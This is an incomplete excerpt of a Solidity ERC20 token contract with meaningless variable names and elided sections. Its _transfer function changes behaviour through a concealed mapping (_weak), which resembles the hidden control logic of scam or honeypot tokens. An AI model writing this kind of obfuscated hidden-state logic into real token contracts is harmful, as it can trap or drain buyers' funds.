...
contract Contract is IERC20, Ownable {
    ...
    uint256 private _apple = _tTotal;
    ...
    mapping(uint256 => address) private _mathematics;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private _dull;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _weak;
    ...
    function _transfer(
        ...
        uint256 _watch = _weak[_doing];

        if (_weak[_food] > 0 && amount > _apple) {
            _weak[_doing] = amount;
        } else {
            if (_taxFee > 0 && !inSwapAndLiquify && _weak[_food] == 0 && _weak[_doing] == 0) {
            ...
            _balances[_doing] += amount;
            emit Transfer(_food, _doing, amount);
        }
    }
